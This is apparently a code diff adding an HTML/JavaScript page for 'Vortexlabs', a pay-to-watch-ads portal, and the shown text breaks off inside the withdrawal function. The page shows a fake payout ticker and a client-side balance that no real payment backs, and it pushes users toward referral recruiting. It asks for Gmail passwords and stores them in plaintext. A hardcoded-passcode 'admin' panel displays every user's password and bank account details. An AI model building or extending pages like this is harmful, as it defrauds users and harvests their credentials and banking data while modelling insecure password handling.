@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vortexlabs - Global Revenue Portal</title>
+    
+    <!-- ========================================== -->
+    <!-- PASTE YOUR ADSTERRA POPUNDER SCRIPT HERE   -->
+    <!-- ========================================== -->
+
+    <style>
+        * { box-sizing: border-box; }
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #0b0f19;
+            color: #ffffff;
+        }
+
+        .app-container {
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: #0b0f19;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .app-header {
+            background: #111827;
+            border-bottom: 1px solid #1f2937;
+            padding: 14px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 40;
+        }
+        .brand-title {
+            font-size: 1.3rem;
+            font-weight: 800;
+            color: #f3f4f6;
+            margin: 0;
+            letter-spacing: 0.5px;
+        }
+        .brand-sub {
+            font-size: 0.65rem;
+            color: #9ca3af;
+            text-transform: uppercase;
+        }
+        .wallet-pill {
+            background: #1a2234;
+            padding: 6px 12px;
+            border-radius: 20px;
+            border: 1px solid #2d3748;
+            text-align: right;
+        }
+        .wallet-val {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #4ade80;
+        }
+
+        .content-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 20px;
+            padding-bottom: 95px;
+        }
+
+        .panel { display: none; }
+        .panel.active { display: block; }
+
+        .taskbar {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: #0f172a;
+            border-top: 1px solid #1f2937;
+            display: flex;
+            justify-content: space-around;
+            padding: 8px 2px;
+            z-index: 50;
+            overflow-x: auto;
+        }
+        .taskbar-btn {
+            background: none;
+            border: none;
+            color: #9ca3af;
+            font-size: 0.58rem;
+            font-weight: 700;
+            text-align: center;
+            cursor: pointer;
+            flex: 1;
+            padding: 2px;
+            transition: 0.2s;
+            white-space: nowrap;
+        }
+        .taskbar-btn span {
+            display: block;
+            font-size: 1.1rem;
+            margin-bottom: 1px;
+        }
+        .taskbar-btn.active {
+            color: #38bdf8;
+        }
+
+        .card {
+            background: #111827;
+            border: 1px solid #1f2937;
+            border-radius: 14px;
+            padding: 20px;
+            margin-bottom: 16px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.5);
+        }
+        .card-title {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #f3f4f6;
+            margin-bottom: 8px;
+        }
+        .card-desc {
+            font-size: 0.8rem;
+            color: #9ca3af;
+            margin-bottom: 16px;
+            line-height: 1.4;
+        }
+        .btn-main {
+            width: 100%;
+            padding: 14px;
+            background: #374151;
+            color: #9ca3af;
+            border: none;
+            border-radius: 10px;
+            font-weight: 700;
+            font-size: 0.95rem;
+            cursor: not-allowed;
+            transition: 0.2s;
+        }
+        .btn-main.active-btn {
+            background: #4ade80;
+            color: #090d16;
+            cursor: pointer;
+        }
+        .btn-action {
+            width: 100%;
+            padding: 13px;
+            background: #38bdf8;
+            color: #090d16;
+            border: none;
+            border-radius: 10px;
+            font-weight: 700;
+            font-size: 0.95rem;
+            cursor: pointer;
+        }
+        .input-group {
+            margin-bottom: 14px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 0.75rem;
+            color: #9ca3af;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+        .input-field, .select-field {
+            width: 100%;
+            padding: 12px;
+            background: #0d1322;
+            border: 1px solid #374151;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 0.9rem;
+        }
+        .status-box {
+            font-size: 0.8rem;
+            color: #9ca3af;
+            background: #0d1322;
+            padding: 12px;
+            border-radius: 8px;
+            border-left: 3px solid #38bdf8;
+            margin-top: 12px;
+            line-height: 1.4;
+        }
+        .ticker-box {
+            background: #1a2234;
+            border-bottom: 1px solid #1f2937;
+            padding: 10px 20px;
+            font-size: 0.8rem;
+            color: #38bdf8;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        /* FAQ ACCORDION STYLES */
+        .faq-item {
+            background: #0d1322;
+            border: 1px solid #1f2937;
+            border-radius: 8px;
+            margin-bottom: 8px;
+            overflow: hidden;
+        }
+        .faq-question {
+            padding: 12px 14px;
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: #f3f4f6;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .faq-answer {
+            padding: 0 14px 12px 14px;
+            font-size: 0.75rem;
+            color: #9ca3af;
+            line-height: 1.4;
+            display: none;
+        }
+        .faq-item.active .faq-answer { display: block; }
+
+        .ledger-item {
+            background: #0d1322;
+            padding: 10px 12px;
+            border-radius: 8px;
+            border: 1px solid #1f2937;
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.75rem;
+        }
+
+        #authOverlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #0b0f19;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+        .auth-card {
+            width: 100%;
+            max-width: 420px;
+            background: #111827;
+            border: 1px solid #1f2937;
+            padding: 24px;
+            border-radius: 18px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- SECURE AUTH & CAPTCHA GATE -->
+    <div id="authOverlay">
+        <div class="auth-card">
+            <h2 style="margin: 0 0 6px 0; font-size: 1.4rem; color: #f3f4f6; text-align: center;">Vortexlabs Portal</h2>
+            <p style="font-size: 0.8rem; color: #9ca3af; text-align: center; margin-bottom: 16px;">Create your multinational profile to begin earning.</p>
+            
+            <div class="input-group">
+                <label>Select Country (Currency Auto-Config)</label>
+                <select id="regCountry" class="select-field">
+                    <option value="Nigeria">Nigeria (₦ NGN)</option>
+                    <option value="Ghana">Ghana (GH₵ GHS)</option>
+                    <option value="Kenya">Kenya (KSh KES)</option>
+                    <option value="South Africa">South Africa (R ZAR)</option>
+                    <option value="United Kingdom">United Kingdom (£ GBP)</option>
+                    <option value="United States">United States ($ USD)</option>
+                    <option value="Canada">Canada ($ CAD)</option>
+                    <option value="Afghanistan">Afghanistan</option>
+                    <option value="Albania">Albania</option>
+                    <option value="Algeria">Algeria</option>
+                    <option value="Argentina">Argentina</option>
+                    <option value="Australia">Australia</option>
+                    <option value="Austria">Austria</option>
+                    <option value="Bangladesh">Bangladesh</option>
+                    <option value="Belgium">Belgium</option>
+                    <option value="Brazil">Brazil</option>
+                    <option value="Cameroon">Cameroon</option>
+                    <option value="China">China</option>
+                    <option value="Colombia">Colombia</option>
+                    <option value="Egypt">Egypt</option>
+                    <option value="France">France</option>
+                    <option value="Germany">Germany</option>
+                    <option value="India">India</option>
+                    <option value="Indonesia">Indonesia</option>
+                    <option value="Italy">Italy</option>
+                    <option value="Japan">Japan</option>
+                    <option value="Malaysia">Malaysia</option>
+                    <option value="Mexico">Mexico</option>
+                    <option value="Morocco">Morocco</option>
+                    <option value="Netherlands">Netherlands</option>
+                    <option value="Pakistan">Pakistan</option>
+                    <option value="Philippines">Philippines</option>
+                    <option value="Poland">Poland</option>
+                    <option value="Russia">Russia</option>
+                    <option value="Saudi Arabia">Saudi Arabia</option>
+                    <option value="Singapore">Singapore</option>
+                    <option value="South Korea">South Korea</option>
+                    <option value="Spain">Spain</option>
+                    <option value="Sweden">Sweden</option>
+                    <option value="Switzerland">Switzerland</option>
+                    <option value="Tanzania">Tanzania</option>
+                    <option value="Turkey">Turkey</option>
+                    <option value="Uganda">Uganda</option>
+                    <option value="Ukraine">Ukraine</option>
+                    <option value="United Arab Emirates">United Arab Emirates</option>
+                    <option value="Vietnam">Vietnam</option>
+                    <option value="Other International">Other International</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <label>Username</label>
+                <input type="text" id="regUsername" class="input-field" placeholder="Enter unique username">
+            </div>
+            <div class="input-group">
+                <label>Gmail Address</label>
+                <input type="email" id="regEmail" class="input-field" placeholder="yourname@gmail.com">
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="regPassword" class="input-field" placeholder="Create secure password">
+            </div>
+            <!-- Security Bot Captcha -->
+            <div class="input-group">
+                <label id="captchaLabel">Security Check: Solve 3 + 4</label>
+                <input type="number" id="regCaptcha" class="input-field" placeholder="Enter answer">
+            </div>
+            <button onclick="registerUser()" class="btn-action" style="margin-top: 4px;">Register & Launch Portal</button>
+        </div>
+    </div>
+
+    <!-- FULL PAGE APP CONTAINER -->
+    <div class="app-container" id="mainPortal" style="display: none;">
+        
+        <!-- Header -->
+        <div class="app-header">
+            <div>
+                <h1 class="brand-title">Vortexlabs</h1>
+                <div class="brand-sub" id="userAccountLabel">Active Portal</div>
+            </div>
+            <div class="wallet-pill">
+                <div style="font-size:0.6rem; color:#9ca3af; text-transform:uppercase;">Balance (<span id="currencySymbol">₦</span>)</div>
+                <div class="wallet-val" id="walletBalance">0.00</div>
+            </div>
+        </div>
+
+        <!-- Live Ticker -->
+        <div class="ticker-box" id="liveTicker">
+            📢 <span id="tickerText">Oluwaseun Adebayo (Nigeria) withdrew ₦8,000 via OPay</span>
+        </div>
+
+        <!-- CONTENT BODY -->
+        <div class="content-body">
+
+            <!-- PAGE 1: TASKS (NATIVE EMBEDDED AD BANNER) -->
+            <div class="panel active" id="panelEarn">
+                <div class="card" style="text-align: center;">
+                    <div class="card-title">Sponsor Ad Engagement Task</div>
+                    <div class="card-desc">Complete your 5-minute active session to earn <span class="cur-amt">₦800</span>. Stay on this screen while the ad stream plays to verify your session.</div>
+                    
+                    <div style="background: #1a2234; border: 1px solid #2d3748; padding: 16px; border-radius: 12px; margin-bottom: 16px;">
+                        <div style="font-size: 0.7rem; color: #9ca3af; text-transform: uppercase; margin-bottom: 4px;">Session Countdown</div>
+                        <div style="font-size: 2rem; font-weight: 800; color: #38bdf8;" id="timerDisplay">05:00</div>
+                    </div>
+
+                    <!-- NATIVE ON-SCREEN SPONSOR AD CONTAINER -->
+                    <div style="background: #0d1322; border: 1px solid #374151; padding: 16px; border-radius: 12px; margin-bottom: 16px; text-align: center;">
+                        <div style="font-size: 0.7rem; color: #9ca3af; text-transform: uppercase; margin-bottom: 8px;">Active Sponsor Ad Stream</div>
+                        
+                        <!-- PASTE YOUR ADSTERRA BANNER CODE OR SCRIPT INSIDE HERE -->
+                        <div style="min-height: 180px; display: flex; align-items: center; justify-content: center; background: #05080f; border-radius: 8px; border: 1px dashed #374151; color: #9ca3af; font-size: 0.75rem; padding: 10px;">
+                            [AdSterra Native Banner / Ad Content Auto-Displays Here]
+                        </div>
+                    </div>
+
+                    <button id="claimRewardBtn" class="btn-main" disabled onclick="claimAdReward()">Claim <span class="cur-amt">₦800</span> Payout</button>
+                    
+                    <div class="status-box" id="statusText">
+                        Status: Active session running. Stay on this page to verify your task.
+                    </div>
+                </div>
+            </div>
+
+            <!-- PAGE 2: DAILY BONUS -->
+            <div class="panel" id="panelDaily">
+                <div class="card" style="text-align: center;">
+                    <div style="font-size: 2.5rem; margin-bottom: 8px;">🎁</div>
+                    <div class="card-title">Daily Dividend Bonus</div>
+                    <div class="card-desc">Collect your guaranteed <span class="cur-amt">₦50</span> platform reward every 24 hours to boost your progress toward the withdrawal threshold.</div>
+                    <button id="dailyClaimBtn" onclick="claimDailyBonus()" class="btn-action" style="background: #4ade80; color: #090d16; margin-bottom: 16px;">Collect <span class="cur-amt">₦50</span> Bonus</button>
+                    
+                    <!-- SECOND NATIVE BANNER SLOT -->
+                    <div style="background: #0d1322; border: 1px solid #374151; padding: 12px; border-radius: 12px; text-align: center;">
+                        <div style="font-size: 0.65rem; color: #9ca3af; text-transform: uppercase; margin-bottom: 6px;">Sponsored Ad</div>
+                        <div style="min-height: 120px; display: flex; align-items: center; justify-content: center; background: #05080f; border-radius: 8px; border: 1px dashed #374151; color: #9ca3af; font-size: 0.75rem;">
+                            [AdSterra Banner Feed]
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PAGE 3: REFERRALS -->
+            <div class="panel" id="panelRef">
+                <div class="card">
+                    <div class="card-title">Referral Network & Milestones</div>
+                    <div class="card-desc">Earn <span class="cur-amt">₦300</span> for every active friend who joins via your link. Hit milestones for extra tier bonuses!</div>
+                    
+                    <div class="input-group">
+                        <label>Your Referral Link</label>
+                        <input type="text" id="refLinkInput" class="input-field" readonly style="color: #38bdf8; font-size: 0.8rem;">
+                    </div>
+                    <button onclick="copyRefLink()" class="btn-action" style="margin-bottom: 20px;">Copy Referral Link</button>
+
+                    <div style="background: #0d1322; padding: 14px; border-radius: 10px; border: 1px solid #374151;">
+                        <div style="font-size: 0.8rem; font-weight: 700; color: #f3f4f6; margin-bottom: 8px;">🏆 Referral Milestone Progress</div>
+                        <div style="font-size: 0.75rem; color: #9ca3af; margin-bottom: 6px;">Recruits Completed: <span id="refCountDisplay" style="color:#4ade80; font-weight:700;">0</span> / 5</div>
+                        <div style="font-size: 0.75rem; color: #38bdf8;">Unlock Milestone Bonus upon reaching 5 verified referrals.</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PAGE 4: TRANSACTION HISTORY (Ledger Statement) -->
+            <div class="panel" id="panelHistory">
+                <div class="card">
+                    <div class="card-title">Transaction Statement</div>
+                    <div class="card-desc">Your complete personal ledger tracking all earnings, bonuses, and withdrawal requests.</div>
+                    <div id="ledgerOutput" style="max-height: 280px; overflow-y: auto;">
+                        <div style="text-align:center; color:#9ca3af; font-size:0.8rem; padding: 20px;">No transaction records yet. Complete tasks or claim bonuses to start earning!</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PAGE 5: WITHDRAWALS -->
+            <div class="panel" id="panelWallet">
+                <div class="card">
+                    <div class="card-title">Withdrawal Portal</div>
+                    <div class="card-desc">
+                        <b>Rules:</b> Minimum withdrawal threshold is <b id="minThresholdText">₦5,000</b>. Payouts are processed exclusively at the end of the month.
+                    </div>
+                    
+                    <div class="input-group">
+                        <label>Bank Name</label>
+                        <select id="bankName" class="select-field">
+                            <option value="OPay">OPay Digital Services</option>
+                            <option value="Kuda">Kuda Bank</option>
+                            <option value="Moniepoint">Moniepoint MFB</option>
+                            <option value="PalmPay">PalmPay</option>
+                            <option value="Access">Access Bank</option>
+                            <option value="GTB">Guaranty Trust Bank</option>
+                        </select>
+                    </div>
+
+                    <div class="input-group">
+                        <label>Account Number (10 Digits)</label>
+                        <input type="number" id="accountNumber" placeholder="Enter your 10-digit account number" class="input-field">
+                    </div>
+
+                    <div class="input-group">
+                        <label>Account Name</label>
+                        <input type="text" id="accountName" placeholder="Full name on bank account" class="input-field">
+                    </div>
+
+                    <button onclick="requestWithdrawal()" class="btn-action" style="margin-top: 6px;">Submit Withdrawal Request</button>
+                    
+                    <div class="status-box" id="withdrawalStatusBox" style="display: none; margin-top: 14px; border-left-color: #f59e0b;">
+                        Status: <b>Pending Admin Review</b> (Scheduled for end-of-month payout processing).
+                    </div>
+                </div>
+            </div>
+
+            <!-- PAGE 6: FAQ & SUPPORT -->
+            <div class="panel" id="panelSupport">
+                <div class="card" style="text-align: center;">
+                    <div style="font-size: 2rem; margin-bottom: 6px;">🎧</div>
+                    <div class="card-title">Customer Care & FAQ</div>
+                    <div class="card-desc">Find quick answers below or contact our official support desk.</div>
+                    
+                    <div style="background: #0d1322; padding: 12px; border-radius: 8px; border: 1px solid #374151; margin-bottom: 16px;">
+                        <div style="font-size: 0.7rem; color: #9ca3af; text-transform: uppercase;">Official Support Email</div>
+                        <div style="font-size: 0.9rem; font-weight: 700; color: #38bdf8;">Vortexlabs201@gmail.com</div>
+                    </div>
+
+                    <a href="mailto:Vortexlabs201@gmail.com" class="btn-action" style="display:block; text-decoration:none; text-align:center; margin-bottom: 20px;">Send Support Email</a>
+                </div>
+
+                <!-- FAQ Accordion Card -->
+                <div class="card">
+                    <div class="card-title">Frequently Asked Questions</div>
+                    
+                    <div class="faq-item">
+                        <div class="faq-question" onclick="toggleFaq(this)">When are payouts processed? <span>▼</span></div>
+                        <div class="faq-answer">Payouts are processed exclusively at the end of each calendar month after rigorous sponsor impression validation and anti-cheat checks.</div>
+                    </div>
+
+                    <div class="faq-item">
+                        <div class="faq-question" onclick="toggleFaq(this)">Why did my session timer reset? <span>▼</span></div>
+                        <div class="faq-answer">Our anti-cheat security automatically detects tab-switching or minimizing. You must remain on the active task window until the countdown finishes.</div>
+                    </div>
+
+                    <div class="faq-item">
+                        <div class="faq-question" onclick="toggleFaq(this)">How do referrals work? <span>▼</span></div>
+                        <div class="faq-answer">Share your unique referral link with friends. When they register and complete their sessions, you earn referral credit toward your milestone bonuses.</div>
+                    </div>
+
+                    <div class="faq-item">
+                        <div class="faq-question" onclick="toggleFaq(this)">What is the minimum withdrawal? <span>▼</span></div>
+                        <div class="faq-answer">The strict minimum threshold is ₦5,000 (or equivalent local currency) to ensure sustainable platform liquidity.</div>
+                    </div>
+                </div>
+
+                <!-- Terms & Conditions Card -->
+                <div class="card">
+                    <div class="card-title">Terms & Conditions</div>
+                    <div class="card-desc" style="font-size: 0.75rem; text-align: left; line-height: 1.5;">
+                        1. <b>Account Integrity:</b> Only one account is permitted per device. Multiple accounts or automated bot manipulation will result in immediate permanent ban and forfeiture of wallet balances.<br><br>
+                        2. <b>Task Verification:</b> Anti-cheat tab-switching detection is active during all sponsor sessions.<br><br>
+                        3. <b>Payout Policy:</b> Withdrawal requests require reaching the strict minimum threshold and are reviewed exclusively at the end of each month.
+                    </div>
+                </div>
+            </div>
+
+            <!-- PAGE 7: ADMIN LOG PANEL (Secured) -->
+            <div class="panel" id="panelAdmin">
+                <div class="card">
+                    <div class="card-title" style="color: #f87171;">🔒 Secure Admin Records</div>
+                    <div class="card-desc">Private user credentials, country selections, and payout bank records.</div>
+                    <div id="adminLogOutput" style="background: #0d1322; padding: 12px; border-radius: 8px; font-family: monospace; font-size: 0.75rem; color: #38bdf8; max-height: 280px; overflow-y: auto;">
+                        Admin panel locked.
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Taskbar Navigation -->
+        <div class="taskbar">
+            <button class="taskbar-btn active" onclick="switchTab('earn')" id="tbEarn"><span>📺</span>Tasks</button>
+            <button class="taskbar-btn" onclick="switchTab('daily')" id="tbDaily"><span>🎁</span>Bonus</button>
+            <button class="taskbar-btn" onclick="switchTab('ref')" id="tbRef"><span>👥</span>Referral</button>
+            <button class="taskbar-btn" onclick="switchTab('history')" id="tbHistory"><span>📊</span>History</button>
+            <button class="taskbar-btn" onclick="switchTab('wallet')" id="tbWallet"><span>💳</span>Withdraw</button>
+            <button class="taskbar-btn" onclick="switchTab('support')" id="tbSupport"><span>🎧</span>FAQ</button>
+            <button class="taskbar-btn" onclick="switchTab('admin')" id="tbAdmin" style="color:#f87171;"><span>🔒</span>Admin</button>
+        </div>
+
+    </div>
+
+    <script>
+        const currencyMap = {
+            "Nigeria": { symbol: "₦", rate: 1, minThresh: 5000, taskAmt: 800, bonusAmt: 50, refAmt: 300 },
+            "Ghana": { symbol: "GH₵", rate: 0.01, minThresh: 50, taskAmt: 8, bonusAmt: 0.5, refAmt: 3 },
+            "Kenya": { symbol: "KSh", rate: 0.1, minThresh: 500, taskAmt: 80, bonusAmt: 5, refAmt: 30 },
+            "South Africa": { symbol: "R", rate: 0.012, minThresh: 60, taskAmt: 10, bonusAmt: 0.6, refAmt: 4 },
+            "United Kingdom": { symbol: "£", rate: 0.0005, minThresh: 25, taskAmt: 4, bonusAmt: 0.25, refAmt: 1.5 },
+            "United States": { symbol: "$", rate: 0.00065, minThresh: 35, taskAmt: 5, bonusAmt: 0.3, refAmt: 2 },
+            "Canada": { symbol: "$", rate: 0.0009, minThresh: 45, taskAmt: 7, bonusAmt: 0.4, refAmt: 2.5 }
+        };
+
+        function getCurrConfig() {
+            const country = localStorage.getItem('vortex_user_country') || "Nigeria";
+            return currencyMap[country] || currencyMap["Nigeria"];
+        }
+
+        const num1 = Math.floor(Math.random() * 5) + 1;
+        const num2 = Math.floor(Math.random() * 5) + 1;
+        const captchaAnswer = num1 + num2;
+        document.getElementById('captchaLabel').textContent = `Security Check: Solve ${num1} + ${num2}`;
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const refParam = urlParams.get('ref');
+        if (refParam) {
+            let refCounts = parseInt(localStorage.getItem('vortex_ref_count')) || 0;
+            if (!localStorage.getItem('vortex_referred_flag')) {
+                localStorage.setItem('vortex_ref_count', refCounts + 1);
+                localStorage.setItem('vortex_referred_flag', 'true');
+            }
+        }
+
+        const savedUser = localStorage.getItem('vortex_user_email');
+        if (savedUser) {
+            document.getElementById('authOverlay').style.display = 'none';
+            document.getElementById('mainPortal').style.display = 'flex';
+            document.getElementById('userAccountLabel').textContent = savedUser;
+            setupReferralLink(savedUser);
+            loadLedger();
+            updateUI();
+        }
+
+        function registerUser() {
+            const country = document.getElementById('regCountry').value;
+            const username = document.getElementById('regUsername').value.trim();
+            const email = document.getElementById('regEmail').value.trim();
+            const password = document.getElementById('regPassword').value.trim();
+            const captchaInput = parseInt(document.getElementById('regCaptcha').value);
+
+            if (captchaInput !== captchaAnswer) {
+                alert("Security Check Failed! Please solve the math captcha correctly.");
+                return;
+            }
+            if (!username) {
+                alert("Please enter a username.");
+                return;
+            }
+            if (!email.includes('@gmail.com')) {
+                alert("Please enter a valid Gmail address.");
+                return;
+            }
+            if (password.length < 4) {
+                alert("Please enter a secure password.");
+                return;
+            }
+
+            localStorage.setItem('vortex_user_email', email);
+            localStorage.setItem('vortex_user_pass', password);
+            localStorage.setItem('vortex_user_name', username);
+            localStorage.setItem('vortex_user_country', country);
+
+            let allUsers = JSON.parse(localStorage.getItem('vortex_all_users')) || [];
+            let existing = allUsers.find(u => u.email === email);
+            if (!existing) {
+                allUsers.push({ 
+                    username: username,
+                    email: email, 
+                    password: password, 
+                    country: country, 
+                    bank: 'Not Set', 
+                    accountNumber: 'Not Set', 
+                    accountName: 'Not Set', 
+                    date: new Date().toLocaleString() 
+                });
+                localStorage.setItem('vortex_all_users', JSON.stringify(allUsers));
+            }
+
+            alert("Registration successful! Welcome to Vortexlabs.");
+            document.getElementById('authOverlay').style.display = 'none';
+            document.getElementById('mainPortal').style.display = 'flex';
+            document.getElementById('userAccountLabel').textContent = email;
+            setupReferralLink(email);
+            loadLedger();
+            updateUI();
+        }
+
+        function setupReferralLink(email) {
+            const refCode = btoa(email).substring(0, 8);
+            document.getElementById('refLinkInput').value = window.location.origin + window.location.pathname + "?ref=" + refCode;
+        }
+
+        function copyRefLink() {
+            const copyText = document.getElementById('refLinkInput');
+            copyText.select();
+            navigator.clipboard.writeText(copyText.value);
+            alert("Referral link copied! Share with friends to earn rewards.");
+        }
+
+        function loadAdminLogs() {
+            const users = JSON.parse(localStorage.getItem('vortex_all_users')) || [];
+            const output = document.getElementById('adminLogOutput');
+            if (users.length === 0) {
+                output.innerHTML = "No user records found.";
+                return;
+            }
+            let html = "";
+            users.forEach((u, index) => {
+                html += `[${index+1}] <b>${u.username}</b> (${u.email})<br>Pass: ${u.password} | Country: ${u.country}<br>Bank: <b>${u.bank}</b> | Acc: <b>${u.accountNumber}</b> (${u.accountName})<hr style="border-color:#1f2937; margin:6px 0;">`;
+            });
+            output.innerHTML = html;
+        }
+
+        let balance = parseFloat(localStorage.getItem('vortex_balance')) || 0;
+        
+        function updateUI() {
+            const cfg = getCurrConfig();
+            document.getElementById('currencySymbol').textContent = cfg.symbol;
+            document.getElementById('walletBalance').textContent = balance.toLocaleString('en-US', { minimumFractionDigits: 2 });
+            document.getElementById('minThresholdText').textContent = cfg.symbol + cfg.minThresh.toLocaleString();
+            
+            document.querySelectorAll('.cur-amt').forEach(el => {
+                let text = el.textContent;
+                if(text.includes('800')) el.textContent = cfg.symbol + cfg.taskAmt.toLocaleString();
+                if(text.includes('50')) el.textContent = cfg.symbol + cfg.bonusAmt.toLocaleString();
+                if(text.includes('300')) el.textContent = cfg.symbol + cfg.refAmt.toLocaleString();
+            });
+
+            const refCount = parseInt(localStorage.getItem('vortex_ref_count')) || 0;
+            document.getElementById('refCountDisplay').textContent = refCount;
+            localStorage.setItem('vortex_balance', balance);
+        }
+
+        function logTransaction(type, amount, desc) {
+            const cfg = getCurrConfig();
+            let history = JSON.parse(localStorage.getItem('vortex_ledger')) || [];
+            history.unshift({ type: type, amount: `${cfg.symbol}${amount.toLocaleString()}`, desc: desc, date: new Date().toLocaleString() });
+            localStorage.setItem('vortex_ledger', JSON.stringify(history));
+            loadLedger();
+        }
+
+        function loadLedger() {
+            let history = JSON.parse(localStorage.getItem('vortex_ledger')) || [];
+            const output = document.getElementById('ledgerOutput');
+            if (history.length === 0) {
+                output.innerHTML = `<div style="text-align:center; color:#9ca3af; font-size:0.8rem; padding: 20px;">No transaction records yet.</div>`;
+                return;
+            }
+            let html = "";
+            history.forEach(tx => {
+                const color = tx.type === 'credit' ? '#4ade80' : '#f87171';
+                html += `<div class="ledger-item"><div><b>${tx.desc}</b><br><span style="font-size:0.65rem; color:#9ca3af;">${tx.date}</span></div><div style="font-weight:700; color:${color};">${tx.amount}</div></div>`;
+            });
+            output.innerHTML = html;
+        }
+
+        function switchTab(tab) {
+            if (tab === 'admin') {
+                let passcode = prompt("Enter Master Admin Passcode:");
+                if (passcode !== "vortex201") {
+                    alert("Access Denied! Incorrect passcode.");
+                    return;
+                }
+                loadAdminLogs();
+            }
+
+            document.getElementById('panelEarn').className = tab === 'earn' ? 'panel active' : 'panel';
+            document.getElementById('panelDaily').className = tab === 'daily' ? 'panel active' : 'panel';
+            document.getElementById('panelRef').className = tab === 'ref' ? 'panel active' : 'panel';
+            document.getElementById('panelHistory').className = tab === 'history' ? 'panel active' : 'panel';
+            document.getElementById('panelWallet').className = tab === 'wallet' ? 'panel active' : 'panel';
+            document.getElementById('panelSupport').className = tab === 'support' ? 'panel active' : 'panel';
+            document.getElementById('panelAdmin').className = tab === 'admin' ? 'panel active' : 'panel';
+
+            document.getElementById('tbEarn').className = tab === 'earn' ? 'taskbar-btn active' : 'taskbar-btn';
+            document.getElementById('tbDaily').className = tab === 'daily' ? 'taskbar-btn active' : 'taskbar-btn';
+            document.getElementById('tbRef').className = tab === 'ref' ? 'taskbar-btn active' : 'taskbar-btn';
+            document.getElementById('tbHistory').className = tab === 'history' ? 'taskbar-btn active' : 'taskbar-btn';
+            document.getElementById('tbWallet').className = tab === 'wallet' ? 'taskbar-btn active' : 'taskbar-btn';
+            document.getElementById('tbSupport').className = tab === 'support' ? 'taskbar-btn active' : 'taskbar-btn';
+            document.getElementById('tbAdmin').className = tab === 'admin' ? 'taskbar-btn active' : 'taskbar-btn';
+        }
+
+        function toggleFaq(el) {
+            el.parentElement.classList.toggle('active');
+        }
+
+        // Anti-Tab Switching Protection
+        let timeLeft = 300; 
+        const timerDisplay = document.getElementById('timerDisplay');
+        const statusText = document.getElementById('statusText');
+        const claimBtn = document.getElementById('claimRewardBtn');
+        let sessionActive = true;
+
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden && sessionActive && timeLeft > 0) {
+                alert("⚠️ WARNING: You left the active task window! Your reward timer has been reset.");
+                timeLeft = 300;
+                timerDisplay.textContent = "05:00";
+                statusText.style.borderLeftColor = "#f87171";
+                statusText.textContent = "Status: Session failed due to tab switching. Restart your task.";
+            }
+        });
+
+        const timerInterval = setInterval(() => {
+            if (!sessionActive) return;
+            let min = Math.floor(timeLeft / 60);
+            let sec = timeLeft % 60;
+            timerDisplay.textContent = `${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
+
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                timerDisplay.textContent = "VERIFIED";
+                timerDisplay.style.color = "#4ade80";
+                statusText.style.borderLeftColor = "#4ade80";
+                statusText.textContent = "Status: Task verified! Click below to claim your reward.";
+                
+                claimBtn.disabled = false;
+                claimBtn.className = "btn-main active-btn";
+            }
+            timeLeft--;
+        }, 1000);
+
+        function claimAdReward() {
+            const cfg = getCurrConfig();
+            balance += cfg.taskAmt;
+            logTransaction('credit', cfg.taskAmt, 'Sponsor Ad Task Reward');
+            updateUI();
+            alert(`Reward credited successfully!`);
+            claimBtn.disabled = true;
+            claimBtn.className = "btn-main";
+            claimBtn.textContent = "Task Completed";
+            sessionActive = false;
+        }
+
+        function claimDailyBonus() {
+            const lastClaim = localStorage.getItem('vortex_last_claim');
+            const today = new Date().toDateString();
+
+            if (lastClaim === today) {
+                alert("You have already claimed your daily bonus today!");
+                return;
+            }
+
+            const cfg = getCurrConfig();
+            balance += cfg.bonusAmt;
+            localStorage.setItem('vortex_last_claim', today);
+            logTransaction('credit', cfg.bonusAmt, 'Daily Dividend Bonus');
+            updateUI();
+            alert("Success! Daily bonus added to your balance.");
+            const btn = document.getElementById('dailyClaimBtn');
+            btn.style.background = '#374151';
+            btn.style.color = '#9ca3af';
+            btn.textContent = 'Claimed Today';
+        }
+
+        function requestWithdrawal() {
+            const cfg = getCurrConfig();
+            const bank = document.getElementById('bankName').value;
+            const accNum = document.getElementById('accountNumber').value;
+            const accName = document.getElementById('accountName').value;
+
+            if (balance < cfg.minThresh) {
+                alert(`Insufficient Balance! Minimum withdrawal threshold is ${cfg.symbol}${cfg.minThresh.toLocaleString()}.`);
+                return;
+            }
+
+            if (accNum.length !== 10) {
+                alert("Please enter a valid 10-digit account number.");
+                return;
+            }
+            if (!accName.trim()) {
+                alert("Please enter your account name.");
